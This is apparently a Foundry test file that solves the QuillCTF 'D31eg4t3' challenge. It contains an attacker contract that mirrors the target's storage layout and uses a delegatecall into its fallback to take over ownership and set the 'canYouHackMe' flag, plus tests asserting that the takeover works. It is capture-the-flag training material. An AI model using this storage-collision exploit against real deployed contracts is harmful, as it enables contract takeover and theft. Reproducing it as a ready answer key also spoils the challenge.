// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../../src/QuillCTF/D31eg4t3/D31eg4t3.sol";

contract D31eg4t3Attacker {
    uint256 slot0;
    uint256 slot1;
    uint256 slot2;
    uint256 slot3;
    uint256 slot4;
    address owner;
    mapping(address => bool) public canYouHackMe; // canYouHackMe

    function pwn(address target) external {
        (bool success, ) = D31eg4t3(target).hackMe("");
        require(success, "failed.");
    }

    fallback() external {
        owner = tx.origin;
        canYouHackMe[tx.origin] = true;
    }
}

contract D31eg4t3Test is Test {
    D31eg4t3 public d31eg4t3;
    D31eg4t3Attacker public d31eg4t3Attacker;

    address public deployer;
    address public attacker;

    function setUp() public {
        deployer = vm.addr(1);
        attacker = vm.addr(2);
        vm.startPrank(deployer);
        d31eg4t3 = new D31eg4t3();
        vm.stopPrank();

        vm.startPrank(attacker);
        d31eg4t3Attacker = new D31eg4t3Attacker();
        vm.stopPrank();
    }

    function testCanYouHackMe() public {
        vm.prank(attacker, attacker);
        d31eg4t3Attacker.pwn(address(d31eg4t3));

        bool hacked = d31eg4t3.canYouHackMe(attacker);
        assertEq(hacked, true);

        address owner = d31eg4t3.owner();
        assertEq(owner, attacker);
    }

    function testOwner() public {
        vm.prank(attacker, attacker);
        d31eg4t3Attacker.pwn(address(d31eg4t3));

        address owner = d31eg4t3.owner();
        assertEq(owner, attacker);
    }
}
